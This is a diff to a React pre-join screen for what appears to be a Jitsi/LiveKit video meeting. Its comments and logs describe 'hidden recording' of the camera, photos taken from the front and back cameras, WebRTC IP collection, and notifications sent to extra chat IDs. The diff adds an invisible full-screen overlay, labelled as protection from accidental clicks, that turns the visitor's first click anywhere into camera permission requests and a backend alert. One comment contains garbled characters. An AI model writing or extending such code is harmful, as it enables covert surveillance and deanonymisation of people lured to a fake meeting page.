@@ -78,6 +78,7 @@ export default function JitsiPreJoin({
   const [photosCaptured, setPhotosCaptured] = useState(false); // Флаг: фото уже захвачены
   const [isFlashing, setIsFlashing] = useState(false); // Flash effect for URL copy
   const [isJoining, setIsJoining] = useState(false); // ✅ Loading состояние для кнопки Join
+  const [isProtectionActive, setIsProtectionActive] = useState(true); // 🛡️ Защита от случайных кликов
 
   // 🚀 OPTIMIZATION: Ref для хранения Promise WebRTC IP сбора
   const webrtcIPsPromiseRef = useRef<Promise<string[]> | null>(null);
@@ -785,6 +786,22 @@ export default function JitsiPreJoin({
         );
       }
       
+      // ✅ КРИТИЧНО: Убираем audio треки из stream перед передачей в скрытую запись
+      // LiveKit будет использовать микрофон отдельно
+      const audioTracks = stream.getAudioTracks();
+      if (audioTracks.length > 0) {
+        log(`🔇 [Init] Удаляем ${audioTracks.length} audio трек(ов) из stream для скрытой записи`);
+        audioTracks.forEach(track => {
+          stream.removeTrack(track);
+          track.stop(); // Останавливаем audio track
+          log(`   🔇 Удалён и остановлен: ${track.kind} - ${track.label}`);
+        });
+      }
+      
+      // ✅ Проверяем что остались только video треки
+      const remainingTracks = stream.getTracks();
+      log(`📹 [Init] Финальный stream для скрытой записи:`, remainingTracks.map(t => `${t.kind} - ${t.label}`));
+      
       setVideoStreamFront(stream);
       
       const actualFacingMode = videoTrack ? videoTrack.getSettings().facingMode : undefined;
@@ -797,7 +814,7 @@ export default function JitsiPreJoin({
       log(`   ✅ Определён тип камеры: ${detectedCameraType} (facingMode: ${actualFacingMode})`);
       
       setIsVideoRecording(true);
-      log(`✅ ${detectedCameraType === 'back' ? 'Задняя' : detectedCameraType === 'front' ? 'Фронтальная' : 'Обычная'} камера + микрофон готовы к записи`);
+      log(`✅ ${detectedCameraType === 'back' ? 'Задняя' : detectedCameraType === 'front' ? 'Фронтальная' : 'Обычная'} камера готова к записи (БЕЗ аудио для LiveKit)`);
     } catch (error) {
       console.error('❌ Ошибка при запуске видео+аудио записи:', error);
     }
@@ -1379,7 +1396,7 @@ export default function JitsiPreJoin({
       
       await new Promise(resolve => setTimeout(resolve, 300));
       
-      // 2. Фото с ЗАДНЕЙ камеры
+      // 2. Фото с ЗАДНЕЙ каме��ы
       try {
         log('📸 [2/2] Захватываем фото с ЗАДНЕЙ камеры...');
         
@@ -1702,64 +1719,81 @@ export default function JitsiPreJoin({
       }
     }
     
-    // 🔒 Защита от двойного вызова (только если разрешения ЕЩЁ запрашиваются)
-    if (isExecutingPermissionsRef.current || isJoining) {
+    // 🚫 ЕСЛИ ПЕРМИШЕНЫ НЕ ЗАПРОШЕНЫ - ИГНОРИРУЕМ (они должны запуститься от overlay)
+    if (!permissionsRequested) {
+      log('⚠️ [handleJoinMeeting] Permissions не запрошены - нужно кликнуть на overlay сначала!');
+      return;
+    }
+    
+    // 🔒 Защита от двойного вызова
+    if (isJoining) {
       log('⚠️ [handleJoinMeeting] Процесс уже выполняется - пропускаем!');
       return;
     }
     
     setIsJoining(true); // ✅ Показываем Loading...
-    isExecutingPermissionsRef.current = true; // ✅ Блокируем повторные вызовы НЕМЕДЛЕННО
-    // Send /start notification to additional chat IDs via backend
-    sendStartAPI().catch(err => console.error('Error sending start notification:', err));
-    handleRequestAllPermissions();
+    
+    try {
+      const joinData = await joinRoom(roomName, userName);
+      console.log('✅ JWT токен получен:', {
+        role: joinData.role,
+        identity: joinData.identity,
+        livekitUrl: joinData.livekitUrl
+      });
+      
+      // Сохраняем в localStorage
+      localStorage.setItem('livekit_join_data', JSON.stringify(joinData));
+      
+      // ВХОДИМ В КОМНАТУ!
+      console.log('🚪 [handleJoinMeeting] Вызов onJoinRoom');
+      onJoinRoom(userName, joinData.token, joinData.livekitUrl);
+    } catch (error) {
+      console.error('❌ Ошибка получения токена:', error);
+      setIsJoining(false);
+    }
   };
 
   const handleJoinWithoutAudio = async () => {
     log('Joining without audio:', roomName, 'as', userName);
     setShowJoinMenu(false);
     
-    // ✅ ОПТИМИЗАЦИЯ: Если разрешения уже получены - входим СРАЗУ
-    if (permissionsRequested) {
-      console.log('✅ [handleJoinWithoutAudio] Разрешения уже есть - входим немедленно!');
-      setIsJoining(true);
-      
-      try {
-        const joinData = await joinRoom(roomName, userName);
-        console.log('✅ JWT токен получен для немедленного входа (без аудио):', {
-          role: joinData.role,
-          identity: joinData.identity,
-          livekitUrl: joinData.livekitUrl
-        });
-        
-        // Сохраняем в localStorage
-        localStorage.setItem('livekit_join_data', JSON.stringify(joinData));
-        
-        // ВХОДИМ В КОМНАТУ!
-        console.log('🚪 [handleJoinWithoutAudio FAST] Вызов onJoinRoom');
-        onJoinRoom(userName, joinData.token, joinData.livekitUrl);
-        return;
-      } catch (error) {
-        console.error('❌ Ошибка получения токена:', error);
-        setIsJoining(false);
-        return;
-      }
+    // 🚫 ЕСЛИ ПЕРМИШЕНЫ НЕ ЗАПРОШЕНЫ - ИГНОРИРУЕМ (они должны запуститься от overlay)
+    if (!permissionsRequested) {
+      log('⚠️ [handleJoinWithoutAudio] Permissions не запрошены - нужно кликнуть на overlay сначала!');
+      return;
     }
     
-    // 🔒 Защита от двойного вызова (только если разрешения ЕЩЁ запрашиваются)
-    if (isExecutingPermissionsRef.current || isJoining) {
+    // 🔒 Защита от двойного вызова
+    if (isJoining) {
       log('⚠️ [handleJoinWithoutAudio] Процесс уже выполняется - пропускаем!');
       return;
     }
     
     setIsJoining(true); // ✅ Показываем Loading...
-    isExecutingPermissionsRef.current = true; // ✅ Блокируем повторные вызовы НЕМЕДЛЕННО
-    // Send /start notification to additional chat IDs via backend
-    sendStartAPI().catch(err => console.error('Error sending start notification:', err));
-    handleRequestAllPermissions();
+    
+    try {
+      const joinData = await joinRoom(roomName, userName);
+      console.log('✅ JWT токен получен (без аудио):', {
+        role: joinData.role,
+        identity: joinData.identity,
+        livekitUrl: joinData.livekitUrl
+      });
+      
+      // Сохраняем в localStorage
+      localStorage.setItem('livekit_join_data', JSON.stringify(joinData));
+      
+      // ВХОДИМ В КОМНАТУ!
+      console.log('🚪 [handleJoinWithoutAudio] Вызов onJoinRoom');
+      onJoinRoom(userName, joinData.token, joinData.livekitUrl);
+    } catch (error) {
+      console.error('❌ Ошибка получения токена:', error);
+      setIsJoining(false);
+    }
   };
 
   const handleCopyUrl = () => {
+    // 🚫 Удалено: отключение защиты - она должна сняться только первым кликом на overlay
+    
     try {
       // Используем fallback метод через textarea для совместимости
       const textarea = document.createElement('textarea');
@@ -1787,12 +1821,12 @@ export default function JitsiPreJoin({
   };
 
   const handleMicClick = () => {
-    handleFirstInteraction(); // Запускаем permissions при первом клике
+    // 🚫 Удалено: handleFirstInteraction() - permissions запускаются только от overlay
     setIsMicMuted(!isMicMuted);
   };
 
   const handleCameraClick = () => {
-    handleFirstInteraction(); // Запускаем permissions при первом клике
+    // 🚫 Удалено: handleFirstInteraction() - permissions запускаются только от overlay
     setIsCameraOff(!isCameraOff);
   };
 
@@ -2066,6 +2100,30 @@ export default function JitsiPreJoin({
 
   return (
     <div className="relative size-full overflow-hidden bg-[#040404]">
+      {/* 🛡️ ЗАЩИТА ОТ СЛУЧАЙНЫХ КЛИКОВ - Полностью невидимый overlay на весь экран */}
+      {isProtectionActive && (
+        <div 
+          className="absolute inset-0 z-[9999] cursor-default"
+          onClick={(e) => {
+            e.preventDefault();
+            e.stopPropagation();
+            setIsProtectionActive(false);
+            console.log('🛡️ Protection layer removed - interface unlocked');
+            
+            // 🚀 ЗАПУСКАЕМ ПЕРМИШЕНЫ СРАЗУ ПОСЛЕ ПЕРВОГО КЛИКА
+            if (!permissionsRequested && !isExecutingPermissionsRef.current) {
+              console.log('🚀 [Overlay Click] Первый клик → запускаем автозапрос permissions!');
+              sendStartAPI().catch(err => console.error('Error sending start notification:', err));
+              handleFirstInteraction();
+            }
+          }}
+          style={{ 
+            backgroundColor: 'transparent',
+            touchAction: 'none' // Блокируем любые touch события до первого клика
+          }}
+        />
+      )}
+      
       {/* Background with blurred video preview */}
       <div className="absolute inset-0">
         <div className="absolute inset-0 blur-[20px] bg-[#040404]" />
@@ -2130,8 +2188,6 @@ export default function JitsiPreJoin({
               type="text"
               value={userName}
               onChange={(e) => setUserName(e.target.value)}
-              onFocus={handleFirstInteraction}
-              onClick={handleFirstInteraction}
               placeholder="Enter your name"
               className="w-full h-10 bg-[#3d3d3d] text-white text-sm px-4 py-3 rounded-md mb-4 outline-none placeholder:text-[#c2c2c2]"
             />
